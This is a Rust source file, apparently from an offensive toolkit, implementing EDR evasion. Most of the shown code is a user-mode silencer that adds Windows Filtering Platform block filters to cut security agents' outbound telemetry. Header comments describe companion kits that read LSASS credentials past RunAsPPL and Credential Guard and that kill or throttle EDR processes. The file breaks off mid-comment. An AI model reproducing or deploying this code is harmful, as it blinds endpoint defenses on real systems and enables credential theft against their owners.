//! Network + credential + EDR-neutralization kits (P2.2 §2.4/§2.5/§4).
//!
//! These three are more operator-orchestrated than the EPROCESS/callback kits:
//! - [`UserModeEdrSilencer`] (`WfpKit`): admin-only, no driver — adds WFP
//!   block filters that drop the EDR's outbound telemetry. Implemented:
//!   pid → image path (`QueryFullProcessImageNameW`) → AppId
//!   (`FwpmGetAppIdFromFileName0`) → a single `FWPM_CONDITION_ALE_APP_ID`
//!   condition on `FWPM_LAYER_ALE_AUTH_CONNECT_V4`. Any resolution/FFI
//!   failure refuses with `Err` — there is no zero-condition fallback
//!   (P0-9). Runtime-verified on-target; host tests cover the condition/
//!   filter data shape.
//! - [`KernelLsassReader`] (`CredKit`): reads LSASS process memory via the
//!   kernel primitive, bypassing RunAsPPL + Credential Guard. Algorithm-heavy
//!   (page walk + read loop). **Address-space contract:** requires a
//!   *physical*-addressing `KernelRw` (see [`KernelRwAddressSpace`]); the
//!   1 MiB image-base window is sparse-tolerant (unmapped pages are skipped)
//!   but does NOT cover the heap-resident credential regions.
//! - [`EdrNeutralizer`] (`EdrNeutralizeKit`): three tiers — Kill (data-write
//!   PPL strip via `KernelRw` + user-mode `TerminateProcess` with protection
//!   rollback on failure; bypasses PPL without any code-page write), Freeze
//!   (user-mode WerFaultSecure coma), Choke (policy-based QoS throttle — the
//!   real EDRChoker mechanics: a WMI `MSFT_NetQosPolicySettingData` ActiveStore
//!   policy keyed on the target's resolved image path, backed by pacer.sys).
//!   Choke refuses loudly when pid→image-path resolution or the WMI policy
//!   creation fails — there is no unconditioned/self-throttle fallback.
//!
//! All unit-tested where the algorithm is pure; the user-mode tiers are
//! framework (operator wires the Win32 calls at link time).

use crate::offsets::EprocessOffsets;
use crate::pagewalk::PhysRead;
use crate::persistence::ProcessHider;
use crate::{CredKit, EdrNeutralizeKit, KernelRw, KitError, NeutralizeMethod, WfpKit};
use alloc::format;
use alloc::string::String;
use alloc::vec::Vec;

// ---- KernelRw address-space contract (kernelsdk-2-1) -----------------------
//
// `KernelRw::kread/kwrite` (lib.rs) documents its addresses as kernel
// **virtual** addresses — that is the base contract every impl satisfies
// (`ByovdDriver`/Shield, `LivingOffDefender`, `VaKernelRw`, …).
//
// The CredKit page-walk path below ([`KrwPhysRead`] + [`KernelLsassReader::read_process_mem`])
// additionally needs a `KernelRw` that interprets addresses as **physical**:
// the DTB and every page-table entry the walk touches are physical addresses.
// That is an EXPLICIT extension contract. Mixing the two spaces silently
// reads unrelated memory — a VA fed to a physical-mode driver maps RAM at the
// VA's bit pattern; a PA fed to a VA-based driver faults or reads garbage.
// The marker + validators below make the space explicit and catch the mix-up
// cheaply at the call boundary (see [`is_plausible_phys_address`] and
// [`is_plausible_kernel_va`]).

/// The address space [`KernelRw::kread`]/[`KernelRw::kwrite`] interpret their
/// `kaddr` argument in.
///
/// The base `KernelRw` contract is [`Self::Virtual`]. [`Self::Physical`] is
/// the extension contract required by the CredKit page-walk path — impls that
/// advertise it (or operators feeding one in) MUST NOT be mixed with
/// virtual-addressing call sites.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum KernelRwAddressSpace {
    /// Kernel **virtual** address — the base `KernelRw` contract.
    Virtual,
    /// **Physical** address — the extension contract required by
    /// [`KrwPhysRead`] / [`KernelLsassReader::read_process_mem`].
    Physical,
}

/// True when `pa` can plausibly be a physical address on x64.
///
/// Physical addresses never set bit 47: real RAM is bounded by 2^46 (64 TiB)
/// today (architectural ceiling 2^52), while canonical kernel VAs
/// (`0xFFFF_8000_…`) and user VAs (`0x0000_8000_…`) both set bit 47. Treating
/// a virtual address as physical therefore fails this check cheaply instead of
/// silently reading unrelated memory. This is a cheap heuristic, not a proof:
/// a corrupted page-table entry can still produce a low-bit pattern.
pub fn is_plausible_phys_address(pa: u64) -> bool {
    pa & (1 << 47) == 0
}

/// True when `va` is a canonical kernel virtual address (x64).
///
/// 48-bit canonical addresses are either user (`0x0000…`–`0x0000_7FFF_FFFF_FFFF`)
/// or kernel (`0xFFFF_8000_0000_0000`–`0xFFFF_FFFF_FFFF_FFFF`); everything
/// between is non-canonical. Feeding a physical address (typically < 2^46) or
/// a user VA into a VA-based `KernelRw` fails this check cheaply. Used by
/// `pagewalk::VaKernelRw` (re-exported as `win::va_rw::VaKernelRw`).
pub fn is_plausible_kernel_va(va: u64) -> bool {
    va >= 0xFFFF_8000_0000_0000
}

/// Adapter: read **physical** memory via a `KernelRw` that interprets
/// addresses as **physical** — the [`KernelRwAddressSpace::Physical`]
/// extension contract, NOT the base VA contract (see the address-space
/// section above). Implements `PhysRead` so `pagewalk::translate_va` can walk
/// page tables using the driver.
///
/// Runtime guard: every address is validated with
/// [`is_plausible_phys_address`] before it reaches the driver, so a
/// virtual-looking address (the classic VA/PA mix-up) fails with a clear
/// error instead of silently reading unrelated memory.
struct KrwPhysRead<'a> {
    krw: &'a dyn KernelRw,
}

impl<'a> PhysRead for KrwPhysRead<'a> {
    fn read_phys(&self, pa: u64, dst: &mut [u8]) -> Result<(), crate::pagewalk::PhysReadError> {
        if !is_plausible_phys_address(pa) {
            // A virtual-looking address was fed to a physical read: the
            // wrapped KernelRw (or a DTB-derived table base) is not
            // physical-addressing. PhysReadError::Overflow = "physical
            // address out of range" — the closest existing variant.
            return Err(crate::pagewalk::PhysReadError::Overflow);
        }
        self.krw
            .kread(pa as usize, dst)
            .map_err(|_| crate::pagewalk::PhysReadError::Ioctl)
    }
}

// ---- §2.4 WfpKit ----------------------------------------------------------

/// User-mode EDR silencer: adds Windows Filtering Platform rules that block
/// the EDR's outbound IPv4 telemetry. Admin-only, **no driver** — the
/// lowest-friction option, at the cost of Event ID 5447 (filter add) +
/// packet-drop traces in the WFP event log. The kernel-tier alternative
/// (overwriting the WFP callout) needs a KernelRw and is lower noise but
/// higher risk.
///
/// **Implementation (P0-9 fix):** WFP has no PID filter condition, so each
/// rule is conditioned on `FWPM_CONDITION_ALE_APP_ID` — resolved as
/// pid → image path (`OpenProcess` + `QueryFullProcessImageNameW`) →
/// `FwpmGetAppIdFromFileName0`. Every filter carries exactly ONE condition
/// (`num_filter_conditions = 1`); there is deliberately no zero-condition
/// fallback, because a condition-less filter on `ALE_AUTH_CONNECT_V4` matches
/// ALL outbound IPv4 traffic (cutting the host's whole network). Any
/// resolution or FFI failure (exited process, access denied / PPL, BFE down)
/// returns `Err` before a filter exists.
///
/// The framework contract holds: the operator binary binds `FwpmEngineOpen0`
/// / `FwpmFilterAdd0` / `FwpmGetAppIdFromFileName0` at link time (resolved
/// from fwpuclnt.dll via [`crate::win::resolve::resolve_sym`]).
pub struct UserModeEdrSilencer;

/// A WFP filter rule template: drop traffic from `pid` matching `protocol`
/// on `port` (0 = any). The operator materializes these via FwpmFilterAdd0.
#[derive(Clone, Copy)]
pub struct WfpBlockRule {
    pub pid: u32,
    pub protocol: u8, // 6 = TCP, 17 = UDP, 0 = any
    pub port: u16,    // 0 = any
}

impl UserModeEdrSilencer {
    /// Build the rule set for a list of EDR PIDs. Each PID gets a
    /// protocol=any/port=any outbound block (the nuclear telemetry-silence
    /// rule). A surgical variant would target only known EDR C2 endpoints.
    pub fn rules_for(edr_pids: &[u32]) -> Vec<WfpBlockRule> {
        let mut out = Vec::new();
        for &pid in edr_pids {
            out.push(WfpBlockRule {
                pid,
                protocol: 0,
                port: 0,
            });
        }
        out
    }
}

/// `FWPM_SESSION_FLAG_DYNAMIC` — session owns its objects; close / process
/// death removes them. Public so diagnostics can report the flags the kit
/// actually requested (the no-residue contract only holds for DYNAMIC).
pub const WFP_SESSION_FLAG_DYNAMIC: u32 = 0x1;

/// Highest sublayer weight (`UINT16`). Higher-weighted sublayers are invoked
/// first; a BLOCK in our own sublayer then vetoes a PERMIT in Windows'
/// default/UNIVERSAL sublayer (the AppContainerLoopback IsLoopback PERMIT
/// that can otherwise win auto-weight arbitration on Server 2025).
pub const WFP_SUBLAYER_WEIGHT: u16 = 0xFFFF;

/// `FWP_UINT8` weight range 15 — highest BFE-computed range inside the
/// sublayer. We own the sublayer, so this is belt-and-suspenders against a
/// second filter landing in the same sublayer.
#[cfg(any(target_os = "windows", test))]
const FWP_UINT8: u32 = 1;
#[cfg(any(target_os = "windows", test))]
const FWP_FILTER_WEIGHT_MAX_RANGE: u64 = 15;

/// `FWP_E_ALREADY_EXISTS` — leftover sublayer from a previous (non-DYNAMIC)
/// session; we still add filters under the well-known Nyx GUID.
#[cfg(target_os = "windows")]
const FWP_E_ALREADY_EXISTS: u32 = 0x8032_0009;

/// Classify a `FwpmEngineOpen0` / `FwpmFilterAdd0` / `FwpmSubLayerAdd0` DWORD
/// as an **environment limit** (skip) rather than a product failure.
///
/// Hosted Server 2025 / Session-0 runners can lack admin or have BFE stopped;
/// those statuses must not be recorded as `blocked=false`. Product bugs
/// (`FWP_E_NULL_DISPLAY_NAME` 0x80320023, invalid layout, …) return `None`.
pub fn wfp_status_env_limit(st: u32) -> Option<&'static str> {
    // HRESULT_FROM_WIN32(x) = 0x80070000 | (x & 0xFFFF). Fwpm* returns either
    // a raw Win32 code or that HRESULT; collapse both.
    let code = if st & 0xFFFF_0000 == 0x8007_0000 {
        st & 0xFFFF
    } else {
        st
    };
    match code {
        5 => Some("access denied (not admin)"),
        1058 => Some("BFE service disabled"),
        1062 => Some("BFE service not active"),
        1717 => Some("BFE RPC unknown interface"),
        1722 => Some("BFE RPC unavailable (service stopped)"),
        1726 => Some("BFE RPC call failed (service stopped)"),
        1753 => Some("BFE RPC endpoint not registered (service stopped)"),
        _ => None,
    }
}

/// True when a [`KitError`] from the WFP path is an environment skip
/// (`env_limit:…`), not a filter/layout product failure.
pub fn wfp_error_is_env_limit(err: &KitError) -> Option<&str> {
    match err {
        KitError::Other(s) => s.strip_prefix("env_limit:"),
        _ => None,
    }
}

#[cfg(target_os = "windows")]
fn wfp_kit_error(op: &str, st: u32) -> KitError {
    match wfp_status_env_limit(st) {
        Some(why) => KitError::Other(format!("env_limit:{why} ({op}={st})")),
        None => KitError::Other(format!("{op} failed: {st}")),
    }
}

#[cfg(target_os = "windows")]
fn wfp_unresolved(sym: &'static str) -> KitError {
    KitError::Other(format!(
        "env_limit:fwpuclnt.dll missing or {sym} unresolved"
    ))
}

/// Compare two Win32 / NT-ish image paths the way AppId matching cares:
/// case-insensitive, slash-normalized, `\\?\` prefix stripped. Empty paths
/// never match (a failed resolve is not "equal").
pub fn wfp_image_paths_equal(a: &str, b: &str) -> bool {
    fn norm(s: &str) -> String {
        let s = s.trim();
        let s = s
            .strip_prefix(r"\\?\")
            .or_else(|| s.strip_prefix("//?/"))
            .unwrap_or(s);
        let mut out = String::new();
        for c in s.chars() {
            let c = if c == '/' { '\\' } else { c };
            out.push(c.to_ascii_lowercase());
        }
        out
    }
    !a.is_empty() && !b.is_empty() && norm(a) == norm(b)
}

impl WfpKit for UserModeEdrSilencer {
    fn silence_edr(&self, edr_pids: &[u32]) -> Result<WfpSilenceGuard, KitError> {
        let rules = Self::rules_for(edr_pids);
        if rules.is_empty() {
            return Err(KitError::UnsupportedPosture("no EDR PIDs provided"));
        }
        wfp_open_silence_session(&rules)
    }
}

/// RAII guard for an active WFP silence session.
///
/// Holds the BFE engine session handle + the filter IDs of every block rule
/// that was added. **Dropping the guard closes the engine session, which
/// auto-removes all filters added under it** — this is the WFP contract
/// (filters are scoped to the session unless explicitly made persistent). This
/// is the cleanup path that prevents the "rules survive process exit and
/// silence the host's network forever" residue bug.
///
/// ## Resilience guarantees
///
/// - **Atomic install:** if adding the Nth filter fails, the guard's Drop rolls
///   back the N-1 already-installed filters by closing the session (the guard
///   is never returned on the error path — it's dropped mid-construction).
/// - **Idempotent teardown:** Drop is safe to call exactly once (the handle is
///   null'd after close). Dropping an already-closed guard is a no-op.
/// - **Network reconnect safety:** because filters live only as long as the
///   session, a host network reconnect / adapter reset / BFE restart after the
///   guard is dropped leaves NO residue — the filters were session-scoped.
///
/// On non-Windows targets this is a zero-sized floor whose construction always
/// fails (WFP is Windows-only); the type exists so cross-platform call sites
/// compile.
pub struct WfpSilenceGuard {
    /// The BFE engine session handle. `null` after close / on the floor impl.
    /// Kept as a raw pointer so the guard is `Send` (WFP sessions aren't shared
    /// across threads in practice — the guard is owned by one operator thread).
    #[cfg(target_os = "windows")]
    engine_handle: *mut core::ffi::c_void,
    /// The filter IDs added under this session. Diagnostic only — close-on-drop
    /// removes ALL session-scoped filters, we don't delete them one-by-one.
    filter_ids: Vec<u64>,
    /// Session flags passed to `FwpmEngineOpen0` (always DYNAMIC).
    session_flags: u32,
    /// `FWP_BYTE_BLOB.size` of each resolved AppId (0 on the floor).
    app_id_blob_lens: Vec<u32>,
    /// Win32 image paths `QueryFullProcessImageNameW` returned per PID.
    image_paths: Vec<String>,
}

// SAFETY: the engine handle is owned exclusively by this guard. WFP's user-mode
// API is thread-safe per-session; we never share the handle across threads.
#[cfg(target_os = "windows")]
unsafe impl Send for WfpSilenceGuard {}

#[cfg(target_os = "windows")]
impl Drop for WfpSilenceGuard {
    fn drop(&mut self) {
        // Close the engine session. Per the WFP contract, closing the session
        // auto-removes every filter added under it (unless FWPM_FILTER_FLAG_
        // PERSISTENT was set, which we never do). This is the single cleanup
        // path: one call, all filters gone, no residue.
        if !self.engine_handle.is_null() {
            type FwpmEngineClose0 = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
            if let Ok(close) = unsafe {
                crate::win::resolve::resolve_sym::<FwpmEngineClose0>(
                    b"fwpuclnt.dll",
                    b"FwpmEngineClose0",
                )
            } {
                let _ = unsafe { close(self.engine_handle) };
            }
            // Null regardless of close success: the handle is dead either way
            // (process is tearing down if resolve failed), and Drop must be
            // idempotent — a double-drop is a silent no-op.
            self.engine_handle = core::ptr::null_mut();
        }
    }
}

/// Cross-platform accessors (read the diagnostic filter-id list — safe on every
/// target, since `filter_ids` is just a Vec; only `engine_handle` is
/// Windows-only). Splitting these out of the `#[cfg(windows)]` block keeps the
/// non-Windows floor warning-free (the field is read, not dead).
impl WfpSilenceGuard {
    /// The filter IDs this session installed. Empty on the non-Windows floor.
    /// Diagnostic / for the operator to log "silenced EDR PIDs via filter IDs {…}".
    pub fn filter_ids(&self) -> &[u64] {
        &self.filter_ids
    }

    /// Number of block filters this session installed. 0 on the non-Windows floor.
    pub fn filter_count(&self) -> usize {
        self.filter_ids.len()
    }

    /// Flags requested at `FwpmEngineOpen0` (0 on the floor).
    pub fn session_flags(&self) -> u32 {
        self.session_flags
    }

    /// AppId blob sizes in the same order as [`Self::filter_ids`].
    pub fn app_id_blob_lens(&self) -> &[u32] {
        &self.app_id_blob_lens
    }

    /// Resolved image paths in the same order as [`Self::filter_ids`].
    pub fn image_paths(&self) -> &[String] {
        &self.image_paths
    }
}

#[cfg(target_os = "windows")]
impl WfpSilenceGuard {
    /// Manually end the session early (drops all filters). Equivalent to
    /// dropping the guard, but lets the operator check the close status.
    /// Returns the Win32 error code from FwpmEngineClose0 (0 = success).
    /// After this the guard is inert (further drops are no-ops).
    pub fn close(mut self) -> u32 {
        type FwpmEngineClose0 = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
        let st = if let Ok(close) = unsafe {
            crate::win::resolve::resolve_sym::<FwpmEngineClose0>(
                b"fwpuclnt.dll",
                b"FwpmEngineClose0",
            )
        } {
            unsafe { close(self.engine_handle) }
        } else {
            0xFFFFFFFF // sentinel for "couldn't resolve FwpmEngineClose0"
        };
        self.engine_handle = core::ptr::null_mut();
        // Don't re-close in Drop: the null check makes the imminent Drop a no-op.
        st
    }
}

// ---- WFP FFI (fwpuclnt.dll) ----
//
// FwpmEngineOpen0 opens a session to the BFE (Base Filtering Engine).
// FwpmGetAppIdFromFileName0 resolves an exe path to an AppId FWP_BYTE_BLOB
//   (BFE-allocated; released with FwpmFreeMemory0).
// FwpmFilterAdd0 adds a filter that blocks traffic matching conditions.
// FwpmEngineClose0 closes the session (auto-removes session-scoped filters).
//
// All are in fwpuclnt.dll (user-mode WFP API). Requires admin + BFE running.
// pid→image-path resolution uses kernel32 OpenProcess +
// QueryFullProcessImageNameW. Docs: https://learn.microsoft.com/en-us/windows/win32/api/fwpmu/

/// Open a WFP engine session + install outbound block filters for each rule.
///
/// Returns a [`WfpSilenceGuard`] that owns the engine session — dropping it
/// closes the session, which auto-removes every filter added under it (the WFP
/// session-scoping contract). **On any failure (engine open or Nth filter
/// add), the session is closed immediately**, rolling back the filters already
/// installed — so a partial silence state never leaks to the host.
///
/// This replaces the old `wfp_add_block_rules` which opened a session but
/// leaked the handle (callers had no way to clean up → filter residue).
#[cfg(target_os = "windows")]
fn wfp_open_silence_session(rules: &[WfpBlockRule]) -> Result<WfpSilenceGuard, KitError> {
    type FwpmEngineOpen0 = unsafe extern "system" fn(
        *const u16,                  // serverName (null = local)
        u32,                         // authnService (RPC_C_AUTHN_WINNT = 10)
        *const core::ffi::c_void,    // authnIdentity (null = default)
        *const core::ffi::c_void,    // session (FWPM_SESSION0, null = default)
        *mut *mut core::ffi::c_void, // engineHandle (OUT)
    ) -> u32; // DWORD WINAPI → returns ERROR_SUCCESS (0)

    type FwpmFilterAdd0 = unsafe extern "system" fn(
        *mut core::ffi::c_void,   // engineHandle
        *const FwpmFilter0,       // filter (IN)
        *const core::ffi::c_void, // PSECURITY_DESCRIPTOR (null)
        *mut u64,                 // id (OUT)
    ) -> u32;

    // Resolve from fwpuclnt.dll. Missing BFE client DLL is an env skip.
    let open: FwpmEngineOpen0 =
        unsafe { crate::win::resolve::resolve_sym(b"fwpuclnt.dll", b"FwpmEngineOpen0") }
            .map_err(|_| wfp_unresolved("FwpmEngineOpen0"))?;
    let add: FwpmFilterAdd0 =
        unsafe { crate::win::resolve::resolve_sym(b"fwpuclnt.dll", b"FwpmFilterAdd0") }
            .map_err(|_| wfp_unresolved("FwpmFilterAdd0"))?;

    // 1. Open engine session — MUST be **dynamic**: filters added on the
    // default (session=NULL) session are PERSISTENT and survive
    // FwpmEngineClose0 (measured on ARM64 Win11 26100, 2026-08-16: the
    // residue phase of wfp-selftest stayed blocked after guard drop).
    // FWPM_SESSION_FLAG_DYNAMIC makes the session own its filters — close
    // (or process death) removes them; the no-residue contract the guard
    // documents only holds for dynamic sessions.
    type GetCurrentProcessId = unsafe extern "system" fn() -> u32;
    let get_pid: GetCurrentProcessId =
        unsafe { crate::win::resolve::resolve_sym(b"kernel32.dll", b"GetCurrentProcessId") }
            .map_err(|_| KitError::Other("GetCurrentProcessId unresolved".into()))?;
    let session = FwpmSession0::dynamic(unsafe { get_pid() });
    let mut engine_handle: *mut core::ffi::c_void = core::ptr::null_mut();
    let st = unsafe {
        open(
            core::ptr::null(), // local server
            10,                // RPC_C_AUTHN_WINNT
            core::ptr::null(), // default identity
            &session as *const FwpmSession0 as *const core::ffi::c_void,
            &mut engine_handle,
        )
    };
    if st != 0 {
        // Access denied / BFE stopped → env_limit, not a product failure.
        return Err(wfp_kit_error("FwpmEngineOpen0", st));
    }

    // Build the guard up-front. On ANY error below we `?`-return, which drops
    // `guard` → its Drop runs FwpmEngineClose0 → the session closes and any
    // filters added so far are auto-removed. This is the atomic-install
    // guarantee: the caller either gets a fully-armed silence session or no
    // filters at all.
    let mut guard = WfpSilenceGuard {
        engine_handle,
        filter_ids: Vec::with_capacity(rules.len()),
        session_flags: WFP_SESSION_FLAG_DYNAMIC,
        app_id_blob_lens: Vec::with_capacity(rules.len()),
        image_paths: Vec::with_capacity(rules.len()),
    };

    // Own high-weight sublayer so a Server 2025 default-sublayer loopback
    // PERMIT cannot out-arbitrate our BLOCK (GUID_NULL = UNIVERSAL, auto
    // weight lost to AppContainerLoopback IsLoopback PERMIT).
    wfp_add_nyx_sublayer(guard.engine_handle)?;

    // 2. Add an AppId-conditioned block filter for each EDR PID (outbound, IPv4).
    for rule in rules {
        // `prepared` owns the BFE-allocated AppId blob + the one-condition
        // array pointing at it; `filter` borrows both. Both stay alive until
        // AFTER FwpmFilterAdd0 returns (Rust drops in reverse declaration
        // order: filter, then prepared → FwpmFreeMemory0 on the blob). If
        // pid→AppId resolution fails, `?` propagates BEFORE any filter for
        // this rule exists, and `guard`'s Drop rolls back earlier filters.
        let prepared = PreparedFilter::block_outbound_for_pid(rule.pid)?;
        let filter = prepared.filter();
        let mut filter_id: u64 = 0;
        let st = unsafe {
            add(
                guard.engine_handle,
                &filter,
                core::ptr::null(),
                &mut filter_id,
            )
        };
        if st != 0 {
            // `guard` is dropped here → session closes → partial filters removed.
            return Err(match wfp_status_env_limit(st) {
                Some(why) => KitError::Other(format!(
                    "env_limit:{why} (FwpmFilterAdd0 pid {}={})",
                    rule.pid, st
                )),
                None => KitError::Other(format!(
                    "FwpmFilterAdd0 failed for pid {}: {}",
                    rule.pid, st
                )),
            });
        }
        guard.filter_ids.push(filter_id);
        guard.app_id_blob_lens.push(prepared.app_id_len);
        guard.image_paths.push(prepared.image_path.clone());
    }

    Ok(guard)
}

/// Add the well-known Nyx sublayer (weight `0xFFFF`, never PERSISTENT) under
/// the current DYNAMIC session. `FWP_E_ALREADY_EXISTS` is ignored so a
/// leftover GUID from the 2026-08-16 non-DYNAMIC bug is still usable.
#[cfg(target_os = "windows")]
fn wfp_add_nyx_sublayer(engine: *mut core::ffi::c_void) -> Result<(), KitError> {
    type FwpmSubLayerAdd0 = unsafe extern "system" fn(
        *mut core::ffi::c_void,
        *const FwpmSubLayer0,
        *const core::ffi::c_void,
    ) -> u32;
    let add: FwpmSubLayerAdd0 =
        unsafe { crate::win::resolve::resolve_sym(b"fwpuclnt.dll", b"FwpmSubLayerAdd0") }
            .map_err(|_| wfp_unresolved("FwpmSubLayerAdd0"))?;
    let sub = FwpmSubLayer0::nyx();
    let st = unsafe { add(engine, &sub, core::ptr::null()) };
    if st != 0 && st != FWP_E_ALREADY_EXISTS {
        return Err(wfp_kit_error("FwpmSubLayerAdd0", st));
    }
    Ok(())
}

#[cfg(not(target_os = "windows"))]
fn wfp_open_silence_session(_rules: &[WfpBlockRule]) -> Result<WfpSilenceGuard, KitError> {
    Err(KitError::UnsupportedPosture("WFP FFI is Windows-only"))
}

// ---- WFP data shapes (host-testable) ----
//
// The GUID constants, FFI struct layouts, and the condition/filter
// construction below are pure data — no FFI calls. They are compiled for
// Windows (real use) and for `cfg(test)` (host-side layout/value tests), so
// host non-test builds stay warning-free. The Windows-only plumbing
// (pid→image path, AppId resolution, RAII blob) follows after them.

/// A Windows GUID in memory layout: the DWORD + two WORDs are serialized
/// little-endian, the trailing 8 bytes verbatim. `align(4)` matches the SDK's
/// GUID alignment so struct offsets below match the real SDK layouts.
#[cfg(any(target_os = "windows", test))]
#[repr(C, align(4))]
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
struct Guid([u8; 16]);

/// The GUID for FWPM_LAYER_ALE_AUTH_CONNECT_V4 (outbound connect, IPv4).
/// SDK: {c38d57d1-05a7-4c33-904f-7fbceee60e82}.
#[cfg(any(target_os = "windows", test))]
const LAYER_ALE_AUTH_CONNECT_V4: Guid = Guid([
    0xD1, 0x57, 0x8D, 0xC3, 0xA7, 0x05, 0x33, 0x4C, 0x90, 0x4F, 0x7F, 0xBC, 0xEE, 0xE6, 0x0E, 0x82,
]);

/// The GUID for FWPM_CONDITION_ALE_APP_ID — the per-application condition,
/// matched against the AppId blob resolved from the target's image path.
/// SDK: {d78e1e87-8644-4ea5-9437-d809ecefc971}.
#[cfg(any(target_os = "windows", test))]
const CONDITION_ALE_APP_ID: Guid = Guid([
    0x87, 0x1E, 0x8E, 0xD7, 0x44, 0x86, 0xA5, 0x4E, 0x94, 0x37, 0xD8, 0x09, 0xEC, 0xEF, 0xC9, 0x71,
]);

/// Nyx WFP silencer sublayer. `{5e9c3a1b-4d7f-4a2e-9b18-7c4e59574e58}`.
/// Not a Microsoft well-known GUID — filters land here instead of
/// `GUID_NULL`/UNIVERSAL so a default-sublayer loopback PERMIT cannot win.
#[cfg(any(target_os = "windows", test))]
const NYX_WFP_SUBLAYER: Guid = Guid([
    0x1B, 0x3A, 0x9C, 0x5E, 0x7F, 0x4D, 0x2E, 0x4A, 0x9B, 0x18, 0x7C, 0x4E, 0x59, 0x57, 0x4E, 0x58,
]);

/// FWP_MATCH_EQUAL — exact-match condition.
#[cfg(any(target_os = "windows", test))]
const FWP_MATCH_EQUAL: u32 = 0;
/// FWP_BYTE_BLOB_TYPE — the FWP_CONDITION_VALUE0 carries an FWP_BYTE_BLOB*.
#[cfg(any(target_os = "windows", test))]
const FWP_BYTE_BLOB_TYPE: u32 = 12;
/// FWP_ACTION_BLOCK = 0x0001 | FWP_ACTION_FLAG_TERMINATING (0x1000).
#[cfg(any(target_os = "windows", test))]
const FWP_ACTION_BLOCK: u32 = 0x1001;

/// FWP_BYTE_BLOB — `{ UINT32 size; UINT8* data; }`.
#[cfg(any(target_os = "windows", test))]
#[repr(C)]
struct FwpByteBlob {
    size: u32,
    data: *mut u8,
}

/// FWP_CONDITION_VALUE0 — `{ FWP_DATA_TYPE type; union { … } }`. We only ever
/// use the `byteBlob` union arm, so the union is modeled as that one pointer
/// (pointer-sized, same layout).
#[cfg(any(target_os = "windows", test))]
#[repr(C)]
struct FwpConditionValue0 {
    value_type: u32,
    byte_blob: *mut FwpByteBlob,
}

/// FWPM_FILTER_CONDITION0 — `{ GUID fieldKey; FWP_MATCH_TYPE matchType;
/// FWP_CONDITION_VALUE0 conditionValue; }` (40 bytes on x64).
#[cfg(any(target_os = "windows", test))]
#[repr(C)]
struct FwpmFilterCondition0 {
    field_key: Guid,
    match_type: u32,
    condition_value: FwpConditionValue0,
}

/// Build the single `FWPM_CONDITION_ALE_APP_ID` / `FWP_MATCH_EQUAL` condition
/// for an AppId blob. Pure data construction — host-testable. The blob is
/// borrowed: the caller must keep `app_id` valid until `FwpmFilterAdd0` has
/// returned (see [`PreparedFilter`]).
#[cfg(any(target_os = "windows", test))]
fn ale_app_id_condition(app_id: *mut FwpByteBlob) -> FwpmFilterCondition0 {
    FwpmFilterCondition0 {
        field_key: CONDITION_ALE_APP_ID,
        match_type: FWP_MATCH_EQUAL,
        condition_value: FwpConditionValue0 {
            value_type: FWP_BYTE_BLOB_TYPE,
            byte_blob: app_id,
        },
    }
}

/// FWPM_SESSION0 — full SDK layout on x64 (72 bytes). We only set `flags`
/// (DYNAMIC) + `processId` + a display name; sessionKey zero lets BFE assign.
/// Per-field x64 offsets (pinned by `wfp_session0_layout_matches_sdk`):
/// ```text
///   0   sessionKey           GUID      (16)
///   16  displayData          { wchar_t* name; wchar_t* desc }
///   32  flags                UINT32    (FWPM_SESSION_FLAG_DYNAMIC = 0x1)
///   36  txnWaitTimeoutInMSec UINT32
///   40  processId            DWORD
///   48  sid                  SID*      (8, align 8 — 44 is pad)
///   56  username             wchar_t*
///   64  kernelMode           BOOL
/// ```
#[repr(C)]
#[cfg(any(target_os = "windows", test))]
struct FwpmSession0 {
    session_key: Guid,
    display_name: *const u16,
    display_desc: *const u16,
    flags: u32,
    txn_wait_ms: u32,
    process_id: u32,
    _pad0: u32,
    sid: *mut core::ffi::c_void,
    username: *mut core::ffi::c_void,
    kernel_mode: i32,
    _pad1: u32,
}

#[cfg(any(target_os = "windows", test))]
impl FwpmSession0 {
    fn dynamic(process_id: u32) -> Self {
        // "NyxWfpSession\0" UTF-16 — static, trivially outlives the open call.
        static SESSION_NAME: [u16; 14] = [
            'N' as u16, 'y' as u16, 'x' as u16, 'W' as u16, 'f' as u16, 'p' as u16, 'S' as u16,
            'e' as u16, 's' as u16, 's' as u16, 'i' as u16, 'o' as u16, 'n' as u16, 0,
        ];
        FwpmSession0 {
            session_key: Guid([0; 16]),
            display_name: SESSION_NAME.as_ptr(),
            display_desc: core::ptr::null(),
            flags: WFP_SESSION_FLAG_DYNAMIC,
            txn_wait_ms: 0,
            process_id,
            _pad0: 0,
            sid: core::ptr::null_mut(),
            username: core::ptr::null_mut(),
            kernel_mode: 0,
            _pad1: 0,
        }
    }
}

/// FWPM_SUBLAYER0 — SDK x64 layout (72 bytes). `flags` is UINT32 (not UINT16).
/// Per-field offsets pinned by `wfp_sublayer0_layout_matches_sdk`:
/// ```text
///   0   subLayerKey    GUID
///   16  displayData    { wchar_t* name; wchar_t* desc }
///   32  flags          UINT32   (never PERSISTENT)
///   40  providerKey    GUID*
///   48  providerData   FWP_BYTE_BLOB
///   64  weight         UINT16
/// ```
#[cfg(any(target_os = "windows", test))]
#[repr(C)]
struct FwpmSubLayer0 {
    sublayer_key: Guid,
    display_name: *const u16,
    display_desc: *const u16,
    flags: u32,
    _pad0: u32,
    provider_key: *const Guid,
    provider_data: FwpByteBlob,
    weight: u16,
    _pad1: [u16; 3],
}

#[cfg(any(target_os = "windows", test))]
impl FwpmSubLayer0 {
    fn nyx() -> Self {
        // "NyxWfpSub\0" UTF-16 — static, outlives FwpmSubLayerAdd0.
        static NAME: [u16; 10] = [
            'N' as u16, 'y' as u16, 'x' as u16, 'W' as u16, 'f' as u16, 'p' as u16, 'S' as u16,
            'u' as u16, 'b' as u16, 0,
        ];
        FwpmSubLayer0 {
            sublayer_key: NYX_WFP_SUBLAYER,
            display_name: NAME.as_ptr(),
            display_desc: core::ptr::null(),
            flags: 0,
            _pad0: 0,
            provider_key: core::ptr::null(),
            provider_data: FwpByteBlob {
                size: 0,
                data: core::ptr::null_mut(),
            },
            weight: WFP_SUBLAYER_WEIGHT,
            _pad1: [0; 3],
        }
    }
}

/// FWPM_FILTER0 — full SDK layout on x64 (200 bytes). Fields we don't use are
/// zeroed; the ones that matter are `layer_key`, `num_filter_conditions` /
/// `filter_conditions`, and `action_type`.
///
/// Cross-checked against the SDK header (`fwpmtypes.h`) / docs.rs windows-sys
/// `FWPM_FILTER0` — per-field x64 offsets (pinned by
